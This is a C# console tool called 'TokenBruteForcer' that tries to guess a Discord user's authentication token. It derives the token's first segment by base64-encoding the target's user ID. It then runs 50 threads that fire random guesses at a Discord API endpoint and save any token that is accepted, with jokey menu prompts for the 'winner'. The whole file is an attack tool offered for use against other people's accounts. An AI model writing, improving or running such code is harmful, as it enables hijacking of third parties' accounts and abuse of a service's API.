using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Data;
using System.Runtime.CompilerServices;

class Program
{
    static readonly object outputLock = new object();
    static readonly Random random = new Random();
    static HttpClient client = new HttpClient();
    static string idToToken;
    static string filesfolder = "TokenBruteForcer Files";
    static string useridtxt = "userID.txt";
    static string useridandfolder = @"TokenBruteForcer Files\userID.txt";
    static string readtxtfile1 = "";
    static string inputId = "";

    static void Main()
    {
        Thread title = new Thread(updatetitle);
        title.Start();
        try
        {
            if (Directory.Exists(filesfolder))
            {
                if (File.Exists(useridandfolder))
                {
                    readtxtfile1 = File.ReadAllText(useridandfolder);
                    if (readtxtfile1.Length == 0)
                    {
                        Main2();
                    }
                    else
                    {
                        inputId = File.ReadAllText(useridandfolder);
                        MainWithoutUserInput();
                    }
                }
                else
                {
                    Main2();
                }
            }
            else
            {
                Directory.CreateDirectory(filesfolder);
                File.CreateText(useridandfolder);
                try
                {
                    Main2();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.ReadKey();
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            Console.ReadKey();
        }
    }
    static void Main2()
    {
        Console.Write("\nUser ID ~> ");
        string inputId2 = Console.ReadLine();
        File.WriteAllText(useridandfolder, inputId2);
        byte[] idBytes = Encoding.ASCII.GetBytes(inputId2);
        idToToken = Convert.ToBase64String(idBytes).TrimEnd('=');

        Console.WriteLine($"\n[ {GetTimeNow()} ] Scraped Half Token | {idToToken}");
        Thread.Sleep(500);

        List<Thread> threads = new List<Thread>();
        for (int i = 0; i < 50; i++)
        {
            Thread thread = new Thread(RunBruteForce);
            threads.Add(thread);
            thread.Start();
        }

        foreach (Thread thread in threads)
        {
            thread.Join();
        }
    }
    static void MainWithoutUserInput()
    {
        Console.WriteLine("[ i ] Used Saved userID");
        byte[] idBytes = Encoding.ASCII.GetBytes(inputId);
        idToToken = Convert.ToBase64String(idBytes).TrimEnd('=');

        Console.WriteLine($"\n[ {GetTimeNow()} ] Scraped Half Token | {idToToken}");
        Thread.Sleep(2500);

        List<Thread> threads = new List<Thread>();
        for (int i = 0; i < 50; i++)
        {
            Thread thread = new Thread(RunBruteForce);
            threads.Add(thread);
            thread.Start();
        }

        foreach (Thread thread in threads)
        {
            thread.Join();
        }
    }
    static void updatetitle()
    {
        while (true)
        {
            Console.Title = $"TokenBruteForce - Made By DewzaCSharp - Date: {DateTime.Now} - Logged in As: {Environment.UserName}";
            Thread.Sleep(100);
        }
    }

    static string GetTimeNow()
    {
        return DateTime.Now.ToString("HH:mm:ss");
    }

    static void Bruteforce()
    {
        string timeNow = GetTimeNow();
        string bruteToken;
        string token;

        if (idToToken.StartsWith("MTA") || idToToken.StartsWith("MTE") || idToToken.StartsWith("MTz"))
        {
            bruteToken = GenerateBruteToken(6, random.Next(39, 43));
        }
        else if (idToToken.StartsWith("O") || idToToken.StartsWith("N") || idToToken.StartsWith("Z"))
        {
            bruteToken = GenerateBruteToken(4, 25);
        }
        else
        {
            bruteToken = GenerateBruteToken(4, 25);
        }

        token = bruteToken.Replace("=", "");

        var headers = new Dictionary<string, string>
        {
            { "Authorization", token }
        };

        Task.Run(async () =>
        {
            var response = await client.GetAsync($"https://discordapp.com/api/v9/auth/login/{token}");
            if (response.StatusCode == System.Net.HttpStatusCode.OK)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n[ {timeNow} ] (+) Bruteforced | {token}");
                SaveToken(token);
                Console.WriteLine("[ i ] Token Saved.");
                Console.WriteLine();
                Console.WriteLine("what do you wanna do now?");
                Console.WriteLine("[1] Continue (Dumb cuz u already got it)");
                Console.WriteLine("[2] Enjoy it");
                Console.WriteLine("[3] Exit");
                string donebruteforcedchoice = Console.ReadLine();
                if (donebruteforcedchoice == "1")
                {
                    Console.Clear();
                    Console.WriteLine("No.");
                    Console.ReadKey();
                }
                else if (donebruteforcedchoice == "2")
                {
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("YAY, YOU GOT THE TOKEN");
                    Console.WriteLine("okay, enough");
                    Console.WriteLine($"here's the token: '{token}'");
                    Console.ReadKey();
                }
                else if (donebruteforcedchoice == "3")
                {
                    Console.WriteLine("totally acceptable...");
                    Console.WriteLine("quitting in 5 Seconds...");
                    Thread.Sleep(5000);
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("this is not an option!");
                    Console.ReadKey();
                }
            }
            else
            {
                lock (outputLock)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write($"\n[ {timeNow} ] (-) Invalid | {token}");
                    Console.WriteLine();
                }
            }
        }).Wait();
    }

    static string GenerateBruteToken(int firstLength, int secondLength)
    {
        string firstPart = GenerateRandomString(firstLength);
        string secondPart = GenerateRandomString(secondLength);
        return $"{idToToken}.{firstPart}.{secondPart}";
    }

    static string GenerateRandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        char[] stringChars = new char[length];
        for (int i = 0; i < length; i++)
        {
            stringChars[i] = chars[random.Next(chars.Length)];
        }
        return new string(stringChars);
    }

    static void SaveToken(string token)
    {
        string folder = "Results";
        if (!Directory.Exists(folder))
        {
            Directory.CreateDirectory(folder);
        }
        File.WriteAllText(Path.Combine(folder, "token_bruteforced.txt"), token);
    }

    static void RunBruteForce()
    {
        while (true)
        {
            try
            {
                Bruteforce();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadKey();
            }
        }
    }
}
